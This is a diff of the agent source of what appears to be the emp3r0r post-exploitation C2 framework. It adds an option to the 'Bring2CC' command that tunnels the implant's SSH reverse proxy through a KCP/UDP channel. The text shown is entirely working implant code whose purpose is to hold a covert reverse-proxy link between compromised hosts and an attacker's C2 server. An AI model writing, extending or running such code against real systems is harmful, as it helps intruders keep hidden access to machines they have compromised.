@@ -58,11 +58,14 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// This will forward our SOCKS5 proxy to the target agent's identical port.
 	case emp3r0r_data.C2CmdBring2CC:
 		addr := flags.StringP("addr", "a", "", "Target agent IP address")
+		kcp := flags.StringP("kcp", "k", "off", "Use KCP for reverse proxy")
 		flags.Parse(cmdSlice[1:])
 		if *addr == "" {
 			out = fmt.Sprintf("Error no address: %v", cmdSlice)
 			return
 		}
+		use_kcp := *kcp == "on"
+
 		out = fmt.Sprintf("Bring2CC: Reverse proxy for %s finished", *addr)
 
 		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
@@ -78,6 +81,15 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 
 		targetAddrWithPort := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.ReverseProxyPort)
 		ctx, cancel := context.WithCancel(context.Background())
+
+		// start a KCP tunnel to encapsulate the SSH reverse proxy
+		if use_kcp {
+			// kcp will forward to this target address
+			targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.KCPClientPort)
+			kcp_server_addr := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.KCPServerPort)
+			go tun.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort, RuntimeConfig.Password, emp3r0r_data.MagicString)
+			util.TakeABlink() // wait for KCP to start
+		}
 		if err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password,
 			&ReverseConns,
 			emp3r0r_data.ProxyServer,
